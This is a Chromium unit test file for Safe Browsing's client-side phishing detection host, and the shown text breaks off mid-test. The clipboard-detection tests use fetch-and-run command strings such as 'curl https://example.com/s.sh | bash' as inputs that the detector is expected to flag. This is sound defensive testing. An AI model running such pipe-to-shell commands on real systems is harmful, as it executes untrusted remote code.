// Copyright 2026 The Chromium Authors
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

#include "components/safe_browsing/core/browser/client_side_detection_host_base.h"

#include <memory>
#include <optional>
#include <string>
#include <vector>

#include "base/memory/weak_ptr.h"
#include "base/test/metrics/histogram_tester.h"
#include "base/test/scoped_feature_list.h"
#include "base/test/task_environment.h"
#include "components/content_settings/core/browser/host_content_settings_map.h"
#include "components/history/core/browser/history_service.h"
#include "components/safe_browsing/core/browser/client_side_detection_feature_cache_base.h"
#include "components/safe_browsing/core/browser/client_side_detection_service_base.h"
#include "components/safe_browsing/core/browser/credit_card_form_event.h"
#include "components/safe_browsing/core/browser/verdict_cache_manager.h"
#include "components/safe_browsing/core/common/features.h"
#include "components/safe_browsing/core/common/proto/csd.pb.h"
#include "components/safe_browsing/core/common/safe_browsing_prefs.h"
#include "components/sync_preferences/testing_pref_service_syncable.h"
#include "net/http/http_status_code.h"
#include "testing/gmock/include/gmock/gmock.h"
#include "testing/gtest/include/gtest/gtest.h"
#include "url/gurl.h"

using ::testing::_;
using ::testing::Optional;
using ::testing::Return;

namespace safe_browsing {

class MockClientSideDetectionServiceBase
    : public ClientSideDetectionServiceBase {
 public:
  MockClientSideDetectionServiceBase()
      : ClientSideDetectionServiceBase(
            std::unique_ptr<ClientSideDetectionServiceBase::Delegate>(nullptr),
            nullptr) {}

  MOCK_METHOD(int, GetTriggerModelVersion, (), (const, override));
  MOCK_METHOD(bool, IsModelAvailable, (), (const, override));
  MOCK_METHOD(void,
              SendClientReportPhishingRequest,
              (std::unique_ptr<ClientPhishingRequest> verdict,
               ClientReportPhishingRequestCallback callback,
               const std::string& access_token),
              (override));
};

class TestClientSideDetectionHostBase : public ClientSideDetectionHostBase {
 public:
  TestClientSideDetectionHostBase(
      VerdictCacheManager* cache_manager,
      PrefService* pref_service,
      history::HistoryService* history_service,
      base::WeakPtr<ClientSideDetectionServiceBase> csd_service,
      bool is_off_the_record)
      : ClientSideDetectionHostBase(csd_service,
                                    cache_manager,
                                    /*intelligent_scan_delegate=*/nullptr,
                                    pref_service,
                                    /*token_fetcher=*/nullptr,
                                    history_service,
                                    is_off_the_record) {}
  ~TestClientSideDetectionHostBase() override = default;

  MOCK_METHOD(void, GetInnerText, (HostInnerTextCallback callback), (override));

  MOCK_METHOD(std::vector<GURL>, GetRedirectChain, (), (override));
  MOCK_METHOD(bool, IsAccountSignedIn, (), (override));
  MOCK_METHOD(bool, IsErrorDocument, (), (override));
  MOCK_METHOD(ChromeUserPopulation, GetUserPopulation, (), (override));
  MOCK_METHOD(void,
              MaybeStartGeminiAntiscamProtection,
              (GURL url,
               ClientSideDetectionType request_type,
               std::optional<bool> did_match_high_confidence_allowlist),
              (override));
  GURL GetCurrentUrl() const override { return current_url(); }
  MOCK_METHOD(void,
              ClassifyPhishingThroughThresholds,
              (ClientPhishingRequest * verdict),
              (override));
  MOCK_METHOD(void, MaybeRunUserReportCallback, (), (override));

  ClientSideDetectionFeatureCacheBase* GetFeatureCache() override {
    return &feature_cache_;
  }

  void MaybeStartImageEmbedding(
      std::unique_ptr<ClientPhishingRequest> verdict,
      std::optional<bool> did_match_high_confidence_allowlist,
      bool is_invalid_ip,
      PhishingDetectorResult result) override {}

  void MaybeStartPreClassification(
      ClientSideDetectionType request_type) override {
    last_preclassification_request_type_ = request_type;
    set_last_committed_url(request_type, current_url());
  }

  credit_card_form::ReferringApp GetReferringApp() const override {
    return referring_app_;
  }

  void set_referring_app(credit_card_form::ReferringApp referring_app) {
    referring_app_ = referring_app;
  }

  MOCK_METHOD(void,
              MaybeShowPhishingWarning,
              (bool is_from_cache,
               ClientSideDetectionType request_type,
               std::optional<bool> did_match_high_confidence_allowlist,
               GURL phishing_url,
               bool is_phishing,
               std::optional<net::HttpStatusCode> response_code,
               std::optional<IntelligentScanVerdict> intelligent_scan_verdict),
              (override));

  void AddReferrerChain(ClientPhishingRequest* verdict) override {}

  using ClientSideDetectionHostBase::
      AddMiscellaneousMetadataToClientPhishingRequest;
  using ClientSideDetectionHostBase::CanGetAccessToken;
  using ClientSideDetectionHostBase::ExtractClipboardData;
  using ClientSideDetectionHostBase::GetTierValue;
  using ClientSideDetectionHostBase::HasDonePreclassificationCheckOnSameURL;
  using ClientSideDetectionHostBase::HasForceRequestFromRtUrlLookup;
  using ClientSideDetectionHostBase::is_classifying;
  using ClientSideDetectionHostBase::is_csd_running;
  using ClientSideDetectionHostBase::MaybeSendClientPhishingRequest;
  using ClientSideDetectionHostBase::NewRequestTypeTierHigher;
  using ClientSideDetectionHostBase::OnCreditCardFormVisitCount;
  using ClientSideDetectionHostBase::OnIntelligentScanDone;
  using ClientSideDetectionHostBase::OnTextCopiedToClipboard;
  using ClientSideDetectionHostBase::PhishingDetectionDone;
  using ClientSideDetectionHostBase::SendRequest;
  using ClientSideDetectionHostBase::set_current_url;
  using ClientSideDetectionHostBase::set_is_classifying;
  using ClientSideDetectionHostBase::set_is_csd_running;
  using ClientSideDetectionHostBase::set_last_request_type;

  ClientSideDetectionFeatureCacheBase feature_cache_;
  std::optional<ClientSideDetectionType> last_preclassification_request_type_;
  credit_card_form::ReferringApp referring_app_ =
      credit_card_form::ReferringApp::kNoReferringApp;
};

class ClientSideDetectionHostBaseTest : public testing::Test {
 protected:
  ClientSideDetectionHostBaseTest() = default;
  ~ClientSideDetectionHostBaseTest() override = default;

  void SetUp() override {
    RegisterProfilePrefs(prefs_.registry());
    HostContentSettingsMap::RegisterProfilePrefs(prefs_.registry());
    content_setting_map_ = new HostContentSettingsMap(
        &prefs_, false /* is_off_the_record */, false /* store_last_modified */,
        false /* restore_session */, false /* should_record_metrics */);
    cache_manager_ = std::make_unique<VerdictCacheManager>(
        /*history_service=*/nullptr, content_setting_map_.get(), &prefs_,
        /*sync_observer=*/nullptr);

    host_ = std::make_unique<TestClientSideDetectionHostBase>(
        cache_manager_.get(), &prefs_, /*history_service=*/nullptr,
        /*csd_service=*/nullptr, /*is_off_the_record=*/false);
  }

  void TearDown() override {
    host_.reset();
    cache_manager_->Shutdown();
    cache_manager_.reset();
    content_setting_map_->ShutdownOnUIThread();
  }

  base::test::TaskEnvironment task_environment_;
  sync_preferences::TestingPrefServiceSyncable prefs_;
  scoped_refptr<HostContentSettingsMap> content_setting_map_;
  std::unique_ptr<VerdictCacheManager> cache_manager_;
  std::unique_ptr<TestClientSideDetectionHostBase> host_;
  base::test::ScopedFeatureList feature_list_;
};

TEST_F(ClientSideDetectionHostBaseTest, PriorityTier) {
  // Lower tier value means higher priority tier.
  EXPECT_EQ(host_->GetTierValue(NOTIFICATION_PERMISSION_PROMPT), 0);
  EXPECT_EQ(host_->GetTierValue(FORCE_REQUEST), 1);
  EXPECT_EQ(host_->GetTierValue(KEYBOARD_LOCK_REQUESTED), 1);
  EXPECT_EQ(host_->GetTierValue(USER_REPORT), 1);
  EXPECT_EQ(host_->GetTierValue(VIBRATION_API), 2);
  EXPECT_EQ(host_->GetTierValue(CLIPBOARD_COPY_API), 2);
  EXPECT_EQ(host_->GetTierValue(CREDIT_CARD_FORM), 2);
  EXPECT_EQ(host_->GetTierValue(UNFAMILIAR_LOGIN_PAGE), 2);
  EXPECT_EQ(host_->GetTierValue(TRIGGER_MODELS), 3);
  EXPECT_EQ(host_->GetTierValue(IMAGE_EMBEDDING_MATCH), 3);

  EXPECT_DEATH_IF_SUPPORTED(
      host_->GetTierValue(CLIENT_SIDE_DETECTION_TYPE_UNSPECIFIED), "");
  EXPECT_DEATH_IF_SUPPORTED(host_->GetTierValue(POINTER_LOCK_REQUESTED), "");
  EXPECT_DEATH_IF_SUPPORTED(host_->GetTierValue(FULLSCREEN_API), "");

  // Default last request type is unspecified, so any new request type is
  // higher.
  EXPECT_TRUE(host_->NewRequestTypeTierHigher(TRIGGER_MODELS));

  // Simulate last request being TRIGGER_MODELS (tier 3):
  host_->set_last_request_type(TRIGGER_MODELS);
  // IMAGE_EMBEDDING_MATCH is also tier 3, so it is not higher (returns false).
  EXPECT_FALSE(host_->NewRequestTypeTierHigher(IMAGE_EMBEDDING_MATCH));
  // KEYBOARD_LOCK_REQUESTED is tier 1 (higher than tier 3), so returns true.
  EXPECT_TRUE(host_->NewRequestTypeTierHigher(KEYBOARD_LOCK_REQUESTED));
}

TEST_F(ClientSideDetectionHostBaseTest,
       HasDonePreclassificationCheckOnSameURL) {
  GURL url1("https://example.com/1");
  GURL url2("https://example.com/2");

  host_->set_current_url(url1);
  // If last_committed_url_map_ doesn't have TRIGGER_MODELS entry, it should
  // return false.
  EXPECT_FALSE(host_->HasDonePreclassificationCheckOnSameURL(TRIGGER_MODELS));

  // Simulating check completed on url1.
  host_->MaybeStartPreClassification(TRIGGER_MODELS);
  EXPECT_TRUE(host_->HasDonePreclassificationCheckOnSameURL(TRIGGER_MODELS));

  // Navigating to url2.
  host_->set_current_url(url2);
  EXPECT_FALSE(host_->HasDonePreclassificationCheckOnSameURL(TRIGGER_MODELS));
}

TEST_F(ClientSideDetectionHostBaseTest, HasForceRequestFromRtUrlLookup) {
  GURL url("https://example.com/");
  host_->set_current_url(url);

  // Enhanced protection is disabled by default.
  SetEnhancedProtectionPrefForTests(&prefs_, false);
  EXPECT_FALSE(host_->HasForceRequestFromRtUrlLookup());

  // Enable Enhanced Protection.
  SetEnhancedProtectionPrefForTests(&prefs_, true);

  // Cache manager has no verdict.
  EXPECT_FALSE(host_->HasForceRequestFromRtUrlLookup());

  // Set cached verdict to FORCE_REQUEST.
  RTLookupResponse response;
  RTLookupResponse::ThreatInfo* threat_info = response.add_threat_info();
  threat_info->set_verdict_type(RTLookupResponse::ThreatInfo::DANGEROUS);
  threat_info->set_threat_type(
      RTLookupResponse::ThreatInfo::SOCIAL_ENGINEERING);
  threat_info->set_cache_duration_sec(60);
  threat_info->set_cache_expression_using_match_type("example.com/");
  threat_info->set_cache_expression_match_type(
      RTLookupResponse::ThreatInfo::EXACT_MATCH);
  response.set_client_side_detection_type(FORCE_REQUEST);
  cache_manager_->CacheRealTimeUrlVerdict(response, base::Time::Now());

  EXPECT_TRUE(host_->HasForceRequestFromRtUrlLookup());
}

TEST_F(ClientSideDetectionHostBaseTest,
       HasForceRequestFromRtUrlLookupRedirectChain) {
  base::test::ScopedFeatureList feature_list;
  feature_list.InitAndDisableFeature(
      kClientSideDetectionRedirectChainKillswitch);

  GURL url1("https://example.com/1");
  GURL url2("https://example.com/2");
  host_->set_current_url(url2);

  SetEnhancedProtectionPrefForTests(&prefs_, true);

  // Redirect chain has url1 and url2.
  std::vector<GURL> redirect_chain = {url1, url2};
  EXPECT_CALL(*host_, GetRedirectChain())
      .WillRepeatedly(Return(redirect_chain));

  // Cache has no entries.
  EXPECT_FALSE(host_->HasForceRequestFromRtUrlLookup());

  // Set cached verdict for redirect source url1 to FORCE_REQUEST.
  RTLookupResponse response;
  RTLookupResponse::ThreatInfo* threat_info = response.add_threat_info();
  threat_info->set_verdict_type(RTLookupResponse::ThreatInfo::DANGEROUS);
  threat_info->set_threat_type(
      RTLookupResponse::ThreatInfo::SOCIAL_ENGINEERING);
  threat_info->set_cache_duration_sec(60);
  threat_info->set_cache_expression_using_match_type("example.com/1");
  threat_info->set_cache_expression_match_type(
      RTLookupResponse::ThreatInfo::EXACT_MATCH);
  response.set_client_side_detection_type(FORCE_REQUEST);
  cache_manager_->CacheRealTimeUrlVerdict(response, base::Time::Now());

  // Should identify FORCE_REQUEST in redirect chain.
  EXPECT_TRUE(host_->HasForceRequestFromRtUrlLookup());

  // Enable redirect chain killswitch.
  base::test::ScopedFeatureList killswitch_feature_list;
  killswitch_feature_list.InitAndEnableFeature(
      kClientSideDetectionRedirectChainKillswitch);

  // With killswitch enabled, it should return false (ignore redirect chain
  // FORCE_REQUEST).
  EXPECT_FALSE(host_->HasForceRequestFromRtUrlLookup());
}

TEST_F(ClientSideDetectionHostBaseTest, OnTextCopiedToClipboard) {
  base::test::ScopedFeatureList feature_list;
  feature_list.InitAndEnableFeatureWithParameters(
      kClientSideDetectionClipboardCopyApi,
      {{"MinLength", "10"}, {"MaxLength", "1000"}});

  // Enhanced Protection is disabled.
  SetEnhancedProtectionPrefForTests(&prefs_, false);
  host_->last_preclassification_request_type_.reset();
  host_->OnTextCopiedToClipboard(u"http://malicious-link.com/payload");

  // Verify that StartPreClassification is NOT called.
  EXPECT_FALSE(host_->last_preclassification_request_type_.has_value());

  // Enable Enhanced Protection.
  SetEnhancedProtectionPrefForTests(&prefs_, true);

  // Too short payload (length 8 < 10).
  host_->OnTextCopiedToClipboard(u"curl abc");
  EXPECT_FALSE(host_->last_preclassification_request_type_.has_value());

  // Too long payload (length 2005 > 1000).
  std::u16string long_payload = u"curl " + std::u16string(2000, 'a');
  host_->OnTextCopiedToClipboard(long_payload);
  EXPECT_FALSE(host_->last_preclassification_request_type_.has_value());

  // Valid payload. `MaybeStartPreClassification()` should be triggered.
  host_->OnTextCopiedToClipboard(
      u"curl http://malicious-link-valid-length-payload.com/");
  ASSERT_TRUE(host_->last_preclassification_request_type_.has_value());
  EXPECT_EQ(host_->last_preclassification_request_type_, CLIPBOARD_COPY_API);
}

TEST_F(ClientSideDetectionHostBaseTest,
       AddMiscellaneousMetadataToClientPhishingRequest) {
  GURL url("https://example.com/some-page");
  host_->set_current_url(url);
  host_->set_last_request_type(TRIGGER_MODELS);

  ChromeUserPopulation population;
  population.set_user_population(ChromeUserPopulation::ENHANCED_PROTECTION);
  EXPECT_CALL(*host_, GetUserPopulation()).WillRepeatedly(Return(population));

  ClientPhishingRequest request;
  request.set_url(url.spec());
  request.set_client_side_detection_type(TRIGGER_MODELS);

  host_->AddMiscellaneousMetadataToClientPhishingRequest(
      &request, /*is_invalid_ip=*/false);

  EXPECT_EQ(request.url(), url.spec());
  EXPECT_EQ(request.client_side_detection_type(), TRIGGER_MODELS);
  EXPECT_EQ(request.population().user_population(),
            ChromeUserPopulation::ENHANCED_PROTECTION);
}

TEST_F(ClientSideDetectionHostBaseTest, PhishingDetectionDoneMetricsAndCache) {
  GURL url("https://example.com/");
  host_->set_current_url(url);

  SetEnhancedProtectionPrefForTests(&prefs_, true);

  MockClientSideDetectionServiceBase mock_csd_service;
  EXPECT_CALL(mock_csd_service, GetTriggerModelVersion())
      .WillRepeatedly(Return(12345));

  host_ = std::make_unique<TestClientSideDetectionHostBase>(
      cache_manager_.get(), &prefs_, /*history_service=*/nullptr,
      mock_csd_service.GetWeakPtr(), /*is_off_the_record=*/false);
  host_->set_current_url(url);

  base::HistogramTester histograms;
  base::TimeTicks start_time = base::TimeTicks::Now();

  ClientPhishingRequest request;
  request.set_url(url.spec());
  request.set_client_score(0.9f);

  host_->PhishingDetectionDone(
      TRIGGER_MODELS, /*is_sample_ping=*/false,
      /*did_match_high_confidence_allowlist=*/false, /*is_invalid_ip=*/false,
      start_time, PhishingDetectorResult::CLASSIFICATION_SUCCESS, request);

  // Histograms should be logged.
  histograms.ExpectUniqueSample(
      "SBClientPhishing.PhishingDetectorResult.TriggerModel",
      PhishingDetectorResult::CLASSIFICATION_SUCCESS, 1);

  // Verify Cache has correct model version.
  auto* metadata =
      host_->feature_cache_.GetOrCreateDebuggingMetadataForURL(url);
  ASSERT_NE(metadata, nullptr);
  EXPECT_EQ(metadata->csd_model_version(), 12345);
  EXPECT_EQ(metadata->phishing_detector_result(),
            PhishingDetectorResult::CLASSIFICATION_SUCCESS);
}

TEST_F(ClientSideDetectionHostBaseTest,
       PhishingDetectionDoneFailedClassification) {
  base::HistogramTester histograms;
  base::TimeTicks start_time = base::TimeTicks::Now();

  // Set internal state to true to verify it is reset.
  host_->set_is_csd_running(true);
  host_->set_is_classifying(true);

  // Failed detector result.
  host_->PhishingDetectionDone(TRIGGER_MODELS, /*is_sample_ping=*/false,
                               /*did_match_high_confidence_allowlist=*/false,
                               /*is_invalid_ip=*/false, start_time,
                               PhishingDetectorResult::CLASSIFIER_NOT_READY,
                               std::nullopt);

  histograms.ExpectUniqueSample(
      "SBClientPhishing.PhishingDetectorResult.TriggerModel",
      PhishingDetectorResult::CLASSIFIER_NOT_READY, 1);

  // Verify state transitions.
  EXPECT_FALSE(host_->is_csd_running());
  EXPECT_FALSE(host_->is_classifying());
}

TEST_F(ClientSideDetectionHostBaseTest, SendRequest) {
  GURL url("https://example.com/");
  host_->set_current_url(url);

  MockClientSideDetectionServiceBase mock_csd_service;
  // Recreate host with injected mock service
  host_ = std::make_unique<TestClientSideDetectionHostBase>(
      cache_manager_.get(), &prefs_, /*history_service=*/nullptr,
      mock_csd_service.GetWeakPtr(), /*is_off_the_record=*/false);
  host_->set_current_url(url);

  auto verdict = std::make_unique<ClientPhishingRequest>();
  verdict->set_url(url.spec());
  verdict->set_client_score(0.9f);
  verdict->set_client_side_detection_type(TRIGGER_MODELS);

  // Verify that Gemini Antiscam protection is potentially started.
  EXPECT_CALL(*host_,
              MaybeStartGeminiAntiscamProtection(url, TRIGGER_MODELS, _))
      .Times(1);

  // Verify that the request is forwarded to the service.
  EXPECT_CALL(mock_csd_service, SendClientReportPhishingRequest(_, _, "token"))
      .WillOnce(
          [](std::unique_ptr<ClientPhishingRequest> verdict,
             ClientSideDetectionServiceBase::ClientReportPhishingRequestCallback
                 callback,
             const std::string& access_token) {
            std::move(callback).Run(GURL("https://example.com/"), true,
                                    net::HTTP_OK, std::nullopt);
          });

  EXPECT_CALL(*host_,
              MaybeShowPhishingWarning(
                  /*is_from_cache=*/false,
                  /*request_type=*/TRIGGER_MODELS,
                  /*did_match_high_confidence_allowlist=*/Optional(false),
                  /*phishing_url=*/GURL("https://example.com/"),
                  /*is_phishing=*/true,
                  /*response_code=*/Optional(net::HTTP_OK),
                  /*intelligent_scan_verdict=*/_))
      .Times(1);

  host_->SendRequest(std::move(verdict), "token",
                     /*did_match_high_confidence_allowlist=*/false,
                     /*is_invalid_ip=*/false);

  // State should be reset.
  EXPECT_FALSE(host_->is_csd_running());
}

// Verifies that OnCreditCardFormVisitCount returns early without triggering
// if the `should_trigger` flag is false.
TEST_F(ClientSideDetectionHostBaseTest,
       OnCreditCardFormVisitCount_ShouldTriggerFalse) {
  SetEnhancedProtectionPrefForTests(&prefs_, true);

  host_->set_current_url(GURL("https://example.com"));

  host_->OnCreditCardFormVisitCount(
      /*start_time=*/std::nullopt,
      credit_card_form::FieldDetectionHeuristic::kAutofillLocal, "event",
      /*should_trigger=*/false,
      history::DailyVisitsResult{/*success=*/true, /*days_with_visits=*/1,
                                 /*total_visits=*/1});

  EXPECT_FALSE(host_->last_preclassification_request_type_.has_value());
}

// Verifies that OnCreditCardFormVisitCount filters out repeat site visits
// when the New Site Filter is enabled.
TEST_F(ClientSideDetectionHostBaseTest,
       OnCreditCardFormVisitCount_NewSiteFilter_RepeatSite) {
  base::test::ScopedFeatureList feature_list;
  feature_list.InitAndEnableFeatureWithParameters(
      kClientSideDetectionCreditCardForm,
      {{kCsdCreditCardFormEnableNewSiteFilter.name, "true"},
       {kCsdCreditCardFormMaxUserVisit.name, "1"}});

  SetEnhancedProtectionPrefForTests(&prefs_, true);

  host_->set_current_url(GURL("https://example.com"));

  // Total visits > 1 means it's a repeat site.
  host_->OnCreditCardFormVisitCount(
      /*start_time=*/std::nullopt,
      credit_card_form::FieldDetectionHeuristic::kAutofillLocal, "event",
      /*should_trigger=*/true,
      history::DailyVisitsResult{/*success=*/true, /*days_with_visits=*/1,
                                 /*total_visits=*/2});

  EXPECT_FALSE(host_->last_preclassification_request_type_.has_value());
}

// Verifies that OnCreditCardFormVisitCount proceeds with pre-classification
// for new site visits when the New Site Filter is enabled.
TEST_F(ClientSideDetectionHostBaseTest,
       OnCreditCardFormVisitCount_NewSiteFilter_NewSite_Proceeds) {
  base::test::ScopedFeatureList feature_list;
  feature_list.InitAndEnableFeatureWithParameters(
      kClientSideDetectionCreditCardForm,
      {{kCsdCreditCardFormEnableNewSiteFilter.name, "true"},
       {kCsdCreditCardFormMaxUserVisit.name, "1"}});

  SetEnhancedProtectionPrefForTests(&prefs_, true);

  host_->set_current_url(GURL("https://example.com"));

  // Total visits <= 1 means it's a new site.
  host_->OnCreditCardFormVisitCount(
      /*start_time=*/std::nullopt,
      credit_card_form::FieldDetectionHeuristic::kAutofillLocal, "event",
      /*should_trigger=*/true,
      history::DailyVisitsResult{/*success=*/true, /*days_with_visits=*/1,
                                 /*total_visits=*/1});

  EXPECT_TRUE(host_->last_preclassification_request_type_.has_value());
  EXPECT_EQ(host_->last_preclassification_request_type_.value(),
            CREDIT_CARD_FORM);
}

// Verifies that OnCreditCardFormVisitCount filters out events detected via
// Autofill Server heuristics when the Heuristic Filter is enabled.
TEST_F(ClientSideDetectionHostBaseTest,
       OnCreditCardFormVisitCount_HeuristicFilter_AutofillServer) {
  base::test::ScopedFeatureList feature_list;
  feature_list.InitAndEnableFeatureWithParameters(
      kClientSideDetectionCreditCardForm,
      {{kCsdCreditCardFormEnableHeuristicFilter.name, "true"}});

  SetEnhancedProtectionPrefForTests(&prefs_, true);

  host_->set_current_url(GURL("https://example.com"));

  host_->OnCreditCardFormVisitCount(
      /*start_time=*/std::nullopt,
      credit_card_form::FieldDetectionHeuristic::kAutofillServer, "event",
      /*should_trigger=*/true,
      history::DailyVisitsResult{/*success=*/true, /*days_with_visits=*/1,
                                 /*total_visits=*/1});

  EXPECT_FALSE(host_->last_preclassification_request_type_.has_value());
}

// Verifies that OnCreditCardFormVisitCount filters out events that do NOT
// originate from the SMS app when the Referring App Filter is enabled.
TEST_F(ClientSideDetectionHostBaseTest,
       OnCreditCardFormVisitCount_ReferringAppFilter_NotSmsApp) {
  base::test::ScopedFeatureList feature_list;
  feature_list.InitAndEnableFeatureWithParameters(
      kClientSideDetectionCreditCardForm,
      {{kCsdCreditCardFormEnableReferringAppFilter.name, "true"}});

  SetEnhancedProtectionPrefForTests(&prefs_, true);

  host_->set_current_url(GURL("https://example.com"));
  // Simulate that the navigation did NOT originate from the SMS app.
  host_->set_referring_app(credit_card_form::ReferringApp::kNoReferringApp);

  host_->OnCreditCardFormVisitCount(
      /*start_time=*/std::nullopt,
      credit_card_form::FieldDetectionHeuristic::kAutofillLocal, "event",
      /*should_trigger=*/true,
      history::DailyVisitsResult{/*success=*/true, /*days_with_visits=*/1,
                                 /*total_visits=*/1});

  EXPECT_FALSE(host_->last_preclassification_request_type_.has_value());
}

TEST_F(ClientSideDetectionHostBaseTest, CanGetAccessToken) {
  // Enhanced protection disabled -> False.
  SetEnhancedProtectionPrefForTests(&prefs_, false);
  EXPECT_FALSE(host_->CanGetAccessToken());

  // Enhanced protection enabled, not signed in -> False.
  SetEnhancedProtectionPrefForTests(&prefs_, true);
  EXPECT_CALL(*host_, IsAccountSignedIn()).WillRepeatedly(Return(false));
  EXPECT_FALSE(host_->CanGetAccessToken());

  // Enhanced protection enabled, signed in, off the record -> False.
  EXPECT_CALL(*host_, IsAccountSignedIn()).WillRepeatedly(Return(true));

  // Recreate host with is_off_the_record = true
  host_ = std::make_unique<TestClientSideDetectionHostBase>(
      cache_manager_.get(), &prefs_, /*history_service=*/nullptr,
      /*csd_service=*/nullptr, /*is_off_the_record=*/true);
  EXPECT_CALL(*host_, IsAccountSignedIn()).WillRepeatedly(Return(true));
  EXPECT_FALSE(host_->CanGetAccessToken());

  // Enhanced protection enabled, signed in, not off the record -> True.
  // Recreate host with is_off_the_record = false
  host_ = std::make_unique<TestClientSideDetectionHostBase>(
      cache_manager_.get(), &prefs_, /*history_service=*/nullptr,
      /*csd_service=*/nullptr, /*is_off_the_record=*/false);
  EXPECT_CALL(*host_, IsAccountSignedIn()).WillRepeatedly(Return(true));
  EXPECT_TRUE(host_->CanGetAccessToken());
}

TEST_F(ClientSideDetectionHostBaseTest, OnIntelligentScanDoneSuccess) {
  base::HistogramTester histograms;
  GURL url("https://example.com/");
  auto verdict = std::make_unique<ClientPhishingRequest>();
  verdict->set_url(url.spec());
  verdict->set_client_side_detection_type(TRIGGER_MODELS);

  IntelligentScanDelegate::IntelligentScanResult response;
  response.execution_success = true;
  response.model_version = 42;
  response.model_type = IntelligentScanDelegate::ModelType::kOnDevice;
  response.brand = "ExampleBrand";
  response.intent = "Phishing";

  MockClientSideDetectionServiceBase mock_csd_service;
  host_ = std::make_unique<TestClientSideDetectionHostBase>(
      cache_manager_.get(), &prefs_, /*history_service=*/nullptr,
      mock_csd_service.GetWeakPtr(), /*is_off_the_record=*/false);
  host_->set_current_url(url);

  // Ensure CanGetAccessToken returns false to avoid needing mock TokenFetcher.
  SetEnhancedProtectionPrefForTests(&prefs_, false);

  EXPECT_CALL(mock_csd_service, SendClientReportPhishingRequest(_, _, _))
      .WillOnce([&](std::unique_ptr<ClientPhishingRequest> sent_verdict,
                    ClientSideDetectionServiceBase::
                        ClientReportPhishingRequestCallback callback,
                    const std::string& access_token) {
        ASSERT_TRUE(sent_verdict->has_intelligent_scan_info());
        const auto& info = sent_verdict->intelligent_scan_info();
        EXPECT_EQ(info.brand(), "ExampleBrand");
        EXPECT_EQ(info.intent(), "Phishing");
        EXPECT_EQ(info.model_version(), 42);
        EXPECT_EQ(info.model_type(), IntelligentScanModelType::ON_DEVICE_MODEL);
      });

  host_->OnIntelligentScanDone(std::move(verdict),
                               /*did_match_high_confidence_allowlist=*/false,
                               /*is_invalid_ip=*/false, response);

  histograms.ExpectUniqueSample(
      "SBClientPhishing.IntelligentScanHasSuccessfulResponse", true, 1);
}

TEST_F(ClientSideDetectionHostBaseTest, OnIntelligentScanDoneFailure) {
  GURL url("https://example.com/");
  host_->set_current_url(url);

  base::HistogramTester histograms;

  auto verdict = std::make_unique<ClientPhishingRequest>();
  verdict->set_url(url.spec());
  verdict->set_client_side_detection_type(TRIGGER_MODELS);

  IntelligentScanDelegate::IntelligentScanResult response;
  response.execution_success = false;
  response.model_version = 42;
  response.model_type = IntelligentScanDelegate::ModelType::kOnDevice;
  response.no_info_reason = IntelligentScanInfo::EMPTY_TEXT;

  // We need to use a mock service to avoid crashes in MaybeGetAccessToken if it
  // proceeds.
  MockClientSideDetectionServiceBase mock_csd_service;
  host_ = std::make_unique<TestClientSideDetectionHostBase>(
      cache_manager_.get(), &prefs_, /*history_service=*/nullptr,
      mock_csd_service.GetWeakPtr(), /*is_off_the_record=*/false);
  host_->set_current_url(url);

  // Ensure CanGetAccessToken returns false to avoid needing mock TokenFetcher.
  SetEnhancedProtectionPrefForTests(&prefs_, false);

  // Verify that model info was logged even though execution should fail.
  EXPECT_CALL(mock_csd_service, SendClientReportPhishingRequest(_, _, _))
      .WillOnce([&](std::unique_ptr<ClientPhishingRequest> sent_verdict,
                    ClientSideDetectionServiceBase::
                        ClientReportPhishingRequestCallback callback,
                    const std::string& access_token) {
        ASSERT_TRUE(sent_verdict->has_intelligent_scan_info());
        const auto& info = sent_verdict->intelligent_scan_info();
        EXPECT_EQ(info.model_version(), 42);
        EXPECT_EQ(info.model_type(), IntelligentScanModelType::ON_DEVICE_MODEL);
        EXPECT_EQ(info.no_info_reason(), IntelligentScanInfo::EMPTY_TEXT);
      });

  host_->OnIntelligentScanDone(std::move(verdict),
                               /*did_match_high_confidence_allowlist=*/false,
                               /*is_invalid_ip=*/false, response);

  histograms.ExpectUniqueSample(
      "SBClientPhishing.IntelligentScanHasSuccessfulResponse", false, 1);
}

// Unit tests for ExtractClipboardData
class ClientSideDetectionHostBaseClipboardDataTest
    : public ClientSideDetectionHostBaseTest {
 public:
  ClipboardExtractedData ExtractFromPayload(const std::u16string& payload) {
    return host_->ExtractClipboardData(payload);
  }
};

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, EmptyPayload) {
  ClipboardExtractedData data = ExtractFromPayload(u"");
  EXPECT_EQ(0, data.suspicious_tokens_size());
  EXPECT_FALSE(data.is_first_token_suspicious());
  EXPECT_FALSE(data.is_last_token_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, NoSusCommands) {
  ClipboardExtractedData data = ExtractFromPayload(u"this is a normal string");
  EXPECT_EQ(0, data.suspicious_tokens_size());
  EXPECT_FALSE(data.is_first_token_suspicious());
  EXPECT_FALSE(data.is_last_token_suspicious());
  EXPECT_FALSE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest,
       SingleSusCommandAtBeginning) {
  ClipboardExtractedData data = ExtractFromPayload(u"curl example.com");
  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("curl"));
  EXPECT_TRUE(data.is_first_token_suspicious());
  EXPECT_FALSE(data.is_last_token_suspicious());
  EXPECT_FALSE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, SingleSusCommandAtEnd) {
  ClipboardExtractedData data = ExtractFromPayload(u"some text with wget");
  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("wget"));
  EXPECT_FALSE(data.is_first_token_suspicious());
  EXPECT_TRUE(data.is_last_token_suspicious());
  EXPECT_FALSE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, SuspiciousCommand) {
  ClipboardExtractedData data =
      ExtractFromPayload(u"curl https://example.com/s.sh | bash");
  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("curl", "bash"));
  EXPECT_TRUE(data.is_first_token_suspicious());
  EXPECT_TRUE(data.is_last_token_suspicious());
  EXPECT_EQ(data.payload_length(), 36);
  EXPECT_EQ(data.total_parsed_tokens(), 3);
  EXPECT_EQ(data.urls_size(), 1);
  EXPECT_TRUE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, MissingRunner) {
  // Loader + URL, but no runner.
  ClipboardExtractedData data = ExtractFromPayload(u"curl https://example.com");
